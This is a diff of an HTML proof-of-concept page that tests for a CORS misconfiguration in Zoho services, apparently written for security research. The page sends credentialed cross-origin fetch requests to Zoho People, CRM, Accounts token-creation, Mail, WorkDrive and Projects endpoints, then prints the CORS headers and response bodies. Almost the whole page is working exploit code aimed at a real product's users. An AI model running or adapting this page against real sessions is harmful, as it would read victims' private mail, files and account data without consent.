@@ -1,67 +1,53 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>CORS PoC - Real Data Fetch</title>
+  <title>CORS Impact PoC</title>
 </head>
 <body>
-  <h2>CORS Real Impact PoC</h2>
-  <p>Pehle Zoho mein login karo, phir test karo</p>
-  <button onclick="runAll()">Run All Tests</button>
-  <pre id="output" style="background:#111;color:#0f0;padding:10px;"></pre>
+  <h2>CORS Real Impact Test</h2>
+  <button onclick="runAll()">Run Test</button>
+  <pre id="output" style="background:#111;color:#0f0;padding:10px;font-size:13px;"></pre>
 
 <script>
 const out = document.getElementById('output');
+function log(msg) { out.textContent += msg + "\n"; }
 
-function log(msg) {
-  out.textContent += msg + "\n";
-}
-
-async function fetchEndpoint(label, url, options = {}) {
+async function test(label, url, opts={}) {
   log("\n=== " + label + " ===");
-  log("URL: " + url);
   try {
-    const res = await fetch(url, {
-      credentials: "include",
-      ...options
-    });
-    log("Status: " + res.status);
+    const res = await fetch(url, { credentials: "include", ...opts });
     const text = await res.text();
-    log("Response (500 chars):\n" + text.substring(0, 500));
+    log("Status: " + res.status);
+    log("ACAO: " + res.headers.get("Access-Control-Allow-Origin"));
+    log("ACAC: " + res.headers.get("Access-Control-Allow-Credentials"));
+    log("Body: " + text.substring(0, 300));
   } catch(e) {
-    log("Error: " + e.message);
+    log("BLOCKED: " + e.message);
   }
 }
 
 async function runAll() {
-  out.textContent = "Testing shuru...\n";
+  out.textContent = "Testing...\n";
 
-  // 1. Upload endpoint - user info
-  await fetchEndpoint(
-    "Upload Endpoint - User Info",
-    "https://upload-accl.zoho.com/upload"
-  );
+  await test("Zoho People - User Info",
+    "https://people.zoho.com/people/api/forms/json/P_EmployeeView/getRecords");
 
-  // 2. WorkDrive files
-  await fetchEndpoint(
-    "WorkDrive - File List",
-    "https://workdrive.zoho.com/api/v1/privatespace"
-  );
+  await test("Zoho CRM - User",
+    "https://crm.zoho.com/crm/private/json/Users/getUsers?type=CurrentUser");
 
-  // 3. Accounts - current user
-  await fetchEndpoint(
-    "Accounts - Current User",
-    "https://accounts.zoho.com/oauth/user/info"
-  );
+  await test("Accounts - User Info",
+    "https://accounts.zoho.com/apiauthtoken/nb/create?SCOPE=ZohoCRM/crmapi&EMAIL_ID=&PASSWORD=");
 
-  // 4. Mail user info
-  await fetchEndpoint(
-    "Mail - User Info",
-    "https://mail.zoho.com/api/accounts"
-  );
+  await test("Zoho Mail - Folders",
+    "https://mail.zoho.com/api/accounts/me/folders");
+
+  await test("WorkDrive - Info",
+    "https://workdrive.zoho.com/api/v1/users/me");
+
+  await test("Projects - Portal",
+    "https://projectsapi.zoho.com/restapi/portal/");
 
   log("\n=== DONE ===");
-  log("Agar kisi bhi endpoint mein actual data aaya,");
-  log("toh CORS impact confirmed hai.");
 }
 </script>
 </body>
